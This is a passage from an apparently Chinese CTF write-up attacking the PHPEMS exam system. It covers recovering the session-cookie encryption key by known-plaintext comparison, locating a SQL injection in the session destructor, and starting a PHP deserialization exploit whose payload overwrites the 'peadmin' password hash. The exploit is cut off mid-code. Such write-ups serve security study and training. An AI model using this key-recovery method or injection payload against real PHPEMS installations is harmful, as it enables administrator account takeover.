class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CS&#x27;</span>,<span class="hljs-string">&#x27;1hqfx6ticwRxtfviTp940vng!yC^QK^6&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-variable">$key</span> = CS;<br><span class="hljs-variable">$kl</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$kl</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$il</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$info</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$il</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$il</span>; <span class="hljs-variable">$i</span>++)<br>&#123;<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$i</span>%<span class="hljs-variable">$kl</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;fff&quot;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$info</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$info</span>[<span class="hljs-variable">$i</span>])+<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$key</span>[<span class="hljs-variable">$p</span>]));<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$info</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$key</span> = CS;<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-variable">$kl</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$key</span>);<br><span class="hljs-variable">$il</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$il</span>; <span class="hljs-variable">$i</span>++)<br>&#123;<br><span class="hljs-variable">$p</span> = <span class="hljs-variable">$i</span>%<span class="hljs-variable">$kl</span>;<br><span class="hljs-variable">$info</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$info</span>[<span class="hljs-variable">$i</span>])-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$key</span>[<span class="hljs-variable">$p</span>]));<br>&#125;<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span>;<br>&#125;<br><br><span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;%92%A2%A4%A0%F3%A9%AE%A2%9D%99%C5%DD%E7%D9%DF%D8%C2%D9%9DVk%E9%A8%9AS%B3e%94%B3%AF%8F%9B%94%99%A8%CB%D9%97%AB%9A%C4%AF%82%AF%D6%9E%D8%CE%87%D2%9Df%92%AD%A2%CBR%DD%A8%80%8C%BE%98ok%8A%E4%CB%EB%A9%DD%D8%D1%E0%C2%9A%AF%D9%B0%A2%8E%92jfg%A4%9E%95Q%A7t%80%8C%BE%98gg%A2%93%D9%DD%A9%E7%D2%D2%E5%C6%E1%E1%CB%E2%D2%C1%D9%ADVk%DF%A8%98X%A9y%96%88%82%94ng%A3%EE&quot;</span>;<br><span class="hljs-variable">$inffo</span> = [<span class="hljs-string">&quot;sessionid&quot;</span> =&gt; <span class="hljs-string">&quot;6bd1ec17eaa71a807b8be3bd2b74d1de&quot;</span>,<span class="hljs-string">&quot;sessionip&quot;</span>=&gt; <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;sessiontimelimit&quot;</span>=&gt;<span class="hljs-string">&quot;1706877686&quot;</span>];<br><span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$inffo</span>);<br><span class="hljs-comment">//print_r(encode($inffo));</span><br><span class="hljs-comment">//var_dump(decode($info));</span><br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>关键在与for循环，encode方法就是将明文每32位+key的ascii输出得到密文，decode就是将密文每32位-key的ascii输出 得到明文，就相当于是a+b&#x3D;c ，key是等于密文-明文</p><p>‍</p><p>所以就可以逆推出密文，因为我们可以控制的IP，那我们就可以通过密文和明文的比对来吧Key给逆推出来，首先先伪造出127.0.0.1</p><p><code>X-FORWARDED-FOR: 127.0.0.1</code>​</p><p>明文就为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;sessionip&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br></code></pre></td></tr></table></figure><p>那我们就要选取密文了</p><p>得到的密文为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">2592</span>%<span class="hljs-number">25</span>A2%<span class="hljs-number">25</span>A4%<span class="hljs-number">25</span>A0%<span class="hljs-number">25</span>F3%<span class="hljs-number">25</span>A9%<span class="hljs-number">25</span>AE%<span class="hljs-number">25</span>A2%<span class="hljs-number">259</span>D%<span class="hljs-number">2599</span>%<span class="hljs-number">25</span>C5%<span class="hljs-number">25</span>DD%<span class="hljs-number">25E7</span>%<span class="hljs-number">25</span>D9%<span class="hljs-number">25</span>DF%<span class="hljs-number">25</span>D8%<span class="hljs-number">25</span>C2%<span class="hljs-number">25</span>D9%<span class="hljs-number">259</span>DVk%<span class="hljs-number">25E9</span>%<span class="hljs-number">25</span>A8%<span class="hljs-number">259</span>AS%<span class="hljs-number">25</span>B3e%<span class="hljs-number">25</span>C0%<span class="hljs-number">2582</span>%<span class="hljs-number">25</span>AD%<span class="hljs-number">2591</span>kf%<span class="hljs-number">259</span>F%<span class="hljs-number">25</span>D4%<span class="hljs-number">259</span>B%<span class="hljs-number">25</span>A8m%<span class="hljs-number">25</span>DA%<span class="hljs-number">25</span>A0%<span class="hljs-number">25</span>C4%<span class="hljs-number">25</span>AA%<span class="hljs-number">2586</span>%<span class="hljs-number">25</span>DA%<span class="hljs-number">25</span>A4%<span class="hljs-number">259</span>D%<span class="hljs-number">25</span>D8%<span class="hljs-number">25</span>A0%<span class="hljs-number">25</span>B5%<span class="hljs-number">25</span>D4%<span class="hljs-number">259</span>Cl%<span class="hljs-number">2591</span>%<span class="hljs-number">25</span>D7%<span class="hljs-number">25</span>D0%<span class="hljs-number">25</span>A0V%<span class="hljs-number">25</span>B1%<span class="hljs-number">25</span>A9%<span class="hljs-number">2580</span>%<span class="hljs-number">258</span>C%<span class="hljs-number">25</span>BE%<span class="hljs-number">2598</span>ok%<span class="hljs-number">258</span>A%<span class="hljs-number">25E4</span>%<span class="hljs-number">25</span>CB%<span class="hljs-number">25</span>EB%<span class="hljs-number">25</span>A9%<span class="hljs-number">25</span>DD%<span class="hljs-number">25</span>D8%<span class="hljs-number">25</span>D1%<span class="hljs-number">25E0</span>%<span class="hljs-number">25</span>C2%<span class="hljs-number">259</span>A%<span class="hljs-number">25</span>AF%<span class="hljs-number">25</span>D9%<span class="hljs-number">25</span>B0%<span class="hljs-number">25</span>A2%<span class="hljs-number">258</span>E%<span class="hljs-number">2592</span>jfg%<span class="hljs-number">25</span>A4%<span class="hljs-number">259</span>E%<span class="hljs-number">2595</span>Q%<span class="hljs-number">25</span>A7t%<span class="hljs-number">2580</span>%<span class="hljs-number">258</span>C%<span class="hljs-number">25</span>BE%<span class="hljs-number">2598</span>gg%<span class="hljs-number">25</span>A2%<span class="hljs-number">2593</span>%<span class="hljs-number">25</span>D9%<span class="hljs-number">25</span>DD%<span class="hljs-number">25</span>A9%<span class="hljs-number">25E7</span>%<span class="hljs-number">25</span>D2%<span class="hljs-number">25</span>D2%<span class="hljs-number">25E5</span>%<span class="hljs-number">25</span>C6%<span class="hljs-number">25E1</span>%<span class="hljs-number">25E1</span>%<span class="hljs-number">25</span>CB%<span class="hljs-number">25E2</span>%<span class="hljs-number">25</span>D2%<span class="hljs-number">25</span>C1%<span class="hljs-number">25</span>D9%<span class="hljs-number">25</span>ADVk%<span class="hljs-number">25</span>DF%<span class="hljs-number">25</span>A8%<span class="hljs-number">2598</span>X%<span class="hljs-number">25</span>A9z%<span class="hljs-number">258</span>E%<span class="hljs-number">2584</span>%<span class="hljs-number">257</span>B%<span class="hljs-number">2590</span>ij%<span class="hljs-number">25</span>A3%<span class="hljs-number">25</span>EE<br></code></pre></td></tr></table></figure><p>先URL解码一次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">%<span class="hljs-number">92</span>%A2%A4%A0%F3%A9%AE%A2%<span class="hljs-number">9</span>D%<span class="hljs-number">99</span>%C5%DD%E7%D9%DF%D8%C2%D9%<span class="hljs-number">9</span>DVk%E9%A8%<span class="hljs-number">9</span>AS%B3e%C0%<span class="hljs-number">82</span>%AD%<span class="hljs-number">91</span>kf%<span class="hljs-number">9</span>F%D4%<span class="hljs-number">9</span>B%A8m%DA%A0%C4%AA%<span class="hljs-number">86</span>%DA%A4%<span class="hljs-number">9</span>D%D8%A0%B5%D4%<span class="hljs-number">9</span>Cl%<span class="hljs-number">91</span>%D7%D0%A0V%B1%A9%<span class="hljs-number">80</span>%<span class="hljs-number">8</span>C%BE%<span class="hljs-number">98</span>ok%<span class="hljs-number">8</span>A%E4%CB%EB%A9%DD%D8%D1%E0%C2%<span class="hljs-number">9</span>A%AF%D9%B0%A2%<span class="hljs-number">8</span>E%<span class="hljs-number">92</span>jfg%A4%<span class="hljs-number">9</span>E%<span class="hljs-number">95</span>Q%A7t%<span class="hljs-number">80</span>%<span class="hljs-number">8</span>C%BE%<span class="hljs-number">98</span>gg%A2%<span class="hljs-number">93</span>%D9%DD%A9%E7%D2%D2%E5%C6%E1%E1%CB%E2%D2%C1%D9%ADVk%DF%A8%<span class="hljs-number">98</span>X%A9z%<span class="hljs-number">8</span>E%<span class="hljs-number">84</span>%<span class="hljs-number">7</span>B%<span class="hljs-number">90</span>ij%A3%EE<br></code></pre></td></tr></table></figure><p>这个就是加密过后的结果，那么我们就要写出逆推脚本，来获取32位可控明文和密文来进行key的推算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 可控32位明文  :&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:1 </span><br><br><span class="hljs-comment">// 密文只能猜测以32位为倍数</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reverse</span>(<span class="hljs-params"><span class="hljs-variable">$payload1</span>,<span class="hljs-variable">$payload2</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$il</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload1</span>);<br>    <span class="hljs-variable">$key</span>= <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$kl</span> = <span class="hljs-number">32</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$il</span>; <span class="hljs-variable">$i</span>++)<br>    &#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable">$i</span>%<span class="hljs-variable">$kl</span>;<br>        <span class="hljs-variable">$key</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload1</span>[<span class="hljs-variable">$i</span>])-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$payload2</span>[<span class="hljs-variable">$p</span>]));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;%92%A2%A4%A0%F3%A9%AE%A2%9D%99%C5%DD%E7%D9%DF%D8%C2%D9%9DVk%E9%A8%9AS%B3e%94%B3%AF%8F%9B%94%99%A8%CB%D9%97%AB%9A%C4%AF%82%AF%D6%9E%D8%CE%87%D2%9Df%92%AD%A2%CBR%DD%A8%80%8C%BE%98ok%8A%E4%CB%EB%A9%DD%D8%D1%E0%C2%9A%AF%D9%B0%A2%8E%92jfg%A4%9E%95Q%A7t%80%8C%BE%98gg%A2%93%D9%DD%A9%E7%D2%D2%E5%C6%E1%E1%CB%E2%D2%C1%D9%ADVk%DF%A8%98X%A9y%96%88%82%94ng%A3%EE&quot;</span>;<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$info</span>);<br><span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$info</span>,<span class="hljs-number">64</span>,<span class="hljs-number">32</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">reverse</span>(<span class="hljs-variable">$info</span>,<span class="hljs-string">&#x27;:&quot;sessionip&quot;;s:9:&quot;127.0.0.1&quot;;s:1&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803260.png" alt="image">​</p><p>‍</p><p>但是远程的靶机上的key不对，所以一样办法重新逆一下得到远程的key为 <code>4b394f264dfcdc724a06b9b05c1e59ed</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803401.png" alt="image">​</p><p>‍</p><p>由于现在主要的目标就是去进入后台，那么我们就要去寻找sql注入的点，并且这个sql注入是包含在了反序列化漏洞中的，于是就找到了<code>Session::__destruct</code>​中的执行sql语句的点</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402041803558.png" alt="image">​</p><p>看上去感觉是预编译了，但是这也就是作者牛逼的地方了吧，首先先跟进<code>makeUpdate</code>​方法(真的是恰好就是更新语句)</p><p>代码比较多，但是都得看，所以贴出代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//生成update sql</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">makeUpdate</span>(<span class="hljs-params"><span class="hljs-variable">$args</span>,<span class="hljs-variable">$tablepre</span> = <span class="hljs-literal">NULL</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$args</span>))<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$tablepre</span> === <span class="hljs-literal">NULL</span>)<span class="hljs-variable">$tb_pre</span> = <span class="hljs-variable language_">$this</span>-&gt;tablepre;<br><span class="hljs-keyword">else</span> <span class="hljs-variable">$tb_pre</span> = <span class="hljs-variable">$tablepre</span>;<br><span class="hljs-variable">$tables</span> = <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>];<br><span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>] = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_makeDefaultUpdateArgs</span>(<span class="hljs-variable">$tables</span>,<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$tables</span>))<br>&#123;<br><span class="hljs-variable">$db_tables</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$tables</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$p</span>)<br>&#123;<br><span class="hljs-variable">$db_tables</span>[] = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$tb_pre&#125;</span><span class="hljs-subst">&#123;$p&#125;</span> AS <span class="hljs-subst">$p</span>&quot;</span>;<br>&#125;<br><span class="hljs-variable">$db_tables</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$db_tables</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-variable">$db_tables</span> = <span class="hljs-variable">$tb_pre</span>.<span class="hljs-variable">$tables</span>;<br><span class="hljs-variable">$v</span> = <span class="hljs-keyword">array</span>();<br><br><span class="hljs-variable">$pars</span> = <span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$pars</span>))<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$parsql</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$pars</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>)<br>&#123;<br><span class="hljs-variable">$parsql</span>[] = <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = &#x27;</span>.<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$key</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>))<span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><span class="hljs-variable">$v</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-variable">$parsql</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$parsql</span>);<br><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$args</span>[<span class="hljs-number">2</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$query</span>))<span class="hljs-variable">$db_query</span> = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$q</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$p</span>)<br>&#123;<br><span class="hljs-variable">$q</span>[] = <span class="hljs-variable">$p</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$p</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&#x27; &#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$p</span>[<span class="hljs-number">2</span>]))<br><span class="hljs-variable">$v</span>[<span class="hljs-variable">$p</span>[<span class="hljs-number">2</span>]] = <span class="hljs-variable">$p</span>[<span class="hljs-number">3</span>];<br>&#125;<br><span class="hljs-variable">$db_query</span> = <span class="hljs-string">&#x27;1 &#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-variable">$q</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">3</span>]))<br><span class="hljs-variable">$db_groups</span> = <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">3</span>])?<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$args</span>[<span class="hljs-number">3</span>]):<span class="hljs-variable">$args</span>[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">else</span><br><span class="hljs-variable">$db_groups</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">4</span>]))<br><span class="hljs-variable">$db_orders</span> = <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">4</span>])?<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$args</span>[<span class="hljs-number">4</span>]):<span class="hljs-variable">$args</span>[<span class="hljs-number">4</span>];<br><span class="hljs-keyword">else</span><br><span class="hljs-variable">$db_orders</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">5</span>]))<br><span class="hljs-variable">$db_limits</span> = <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">5</span>])?<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$args</span>[<span class="hljs-number">5</span>]):<span class="hljs-variable">$args</span>[<span class="hljs-number">5</span>];<br><span class="hljs-keyword">else</span><br><span class="hljs-variable">$db_limits</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$db_limits</span> &lt;span style=<span class="hljs-string">&quot;font-weight: bold;&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">mark</span>&quot;&gt; <span class="hljs-title">false</span> &amp;&amp; $<span class="hljs-title">db_limits</span> !&lt;/<span class="hljs-title">span</span>&gt; <span class="hljs-title">false</span>)$<span class="hljs-title">db_limits</span> = $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">_mostlimits</span>;</span><br><span class="hljs-class">$<span class="hljs-title">db_groups</span> = $<span class="hljs-title">db_groups</span>?&#x27; <span class="hljs-title">GROUP</span> <span class="hljs-title">BY</span> &#x27;.$<span class="hljs-title">db_groups</span>:&#x27;&#x27;;</span><br><span class="hljs-class">$<span class="hljs-title">db_orders</span> = $<span class="hljs-title">db_orders</span>?&#x27; <span class="hljs-title">ORDER</span> <span class="hljs-title">BY</span> &#x27;.$<span class="hljs-title">db_orders</span>:&#x27;&#x27;;</span><br><span class="hljs-class">$<span class="hljs-title">sql</span> = &#x27;<span class="hljs-title">UPDATE</span> &#x27;.$<span class="hljs-title">db_tables</span>.&#x27; <span class="hljs-title">SET</span> &#x27;.$<span class="hljs-title">parsql</span>.&#x27; <span class="hljs-title">WHERE</span> &#x27;.$<span class="hljs-title">db_query</span>.$<span class="hljs-title">db_groups</span>.$<span class="hljs-title">db_orders</span>.&#x27; <span class="hljs-title">LIMIT</span> &#x27;.$<span class="hljs-title">db_limits</span>;</span><br><span class="hljs-class"><span class="hljs-title">return</span> <span class="hljs-title">array</span>(&#x27;<span class="hljs-title">sql</span>&#x27; =&gt; $<span class="hljs-title">sql</span>, &#x27;<span class="hljs-title">v</span>&#x27; =&gt; $<span class="hljs-title">v</span>);</span><br><span class="hljs-class">&#125;</span><br></code></pre></td></tr></table></figure><p>我们可以发现传入的数组虽然有用但是不可控，但是可以发现<code>$db_tables</code>​属性是该类初始化的赋值的，那么通过反序列化就可以进行初始化这个属性从而达到一个sql注入的效果(这种sql我感觉还是非常牛逼的，因为无视了预编译吧，直接赋值拼接的)</p><p>所以EXP参考EDI的EXP(让我写真写不出来)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PHPEMS</span>&#123;  <br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">session</span>&#123;  <br>    <span class="hljs-title class_">public</span> <span class="hljs-title class_">function</span> <span class="hljs-title class_">__construct</span>()  <br>    &#123;  <br>        $<span class="hljs-title class_">this</span>-&gt;<span class="hljs-title class_">sessionid</span>=&quot;1111111&quot;;  <br>        <span class="hljs-variable language_">$this</span>-&gt;pdosql= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pdosql</span>();  <br>        <span class="hljs-variable language_">$this</span>-&gt;db= <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pepdo</span>();  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pdosql</span>  </span><br><span class="hljs-class">    </span>&#123;  <br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span> ;  <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function">        </span>&#123;  <br>            <span class="hljs-variable language_">$this</span>-&gt;tablepre = <span class="hljs-string">&#x27;x2_user set userpassword=&quot;e10adc3949ba59abbe56e057f20f883e&quot; where username=&quot;peadmin&quot;;#--&#x27;</span>;  <br>            <span class="hljs-variable language_">$this</span>-&gt;db=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pepdo</span>();  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pepdo</span>  </span><br><span class="hljs-class">    </span>&#123;  <br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$linkid</span> = <span class="hljs-number">0</span>;  <br>    &#125;  <br>&#125;  <br>  <br><span class="hljs-keyword">namespace</span> &#123;  <br>    $<span 